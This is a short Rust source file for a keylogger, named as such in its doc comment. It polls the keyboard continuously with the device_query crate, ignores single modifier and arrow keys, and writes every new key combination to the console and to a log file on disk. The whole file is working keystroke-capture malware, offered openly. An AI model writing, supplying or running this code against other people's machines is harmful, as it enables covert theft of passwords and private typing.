use device_query::{DeviceQuery, DeviceState};
use std::fs::OpenOptions;
use std::io::Write;

/// Keylogger launch function
pub fn run(path: String) {
    let device_state = DeviceState::new();

    let mut prev_keys = vec![];

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .expect("Failed to open file");

    // List of keys to ignore
    let filter_keys: Vec<String> = [
        "Enter",
        "Backspace",
        "LShift",
        "RShift",
        "LControl",
        "RControl",
        "LAlt",
        "RAlt",
        "Right",
        "Left",
        "Up",
        "Down",
        "Escape",
        "Meta",
    ]
    .iter()
    .map(|v| v.to_string())
    .collect();

    loop {
        let keys = device_state.get_keys();
        if keys != prev_keys && !keys.is_empty() {
            // Filter out unwanted single keys
            if keys.len() == 1 {
                if filter_keys.contains(&format!("{:?}", keys[0])) {
                    continue;
                }
            }

            let s = format!("{:?}", keys);
            println!("{}", s);

            writeln!(file, "{}", s).expect("Failed to write to file");
        }
        prev_keys = keys;
    }
}
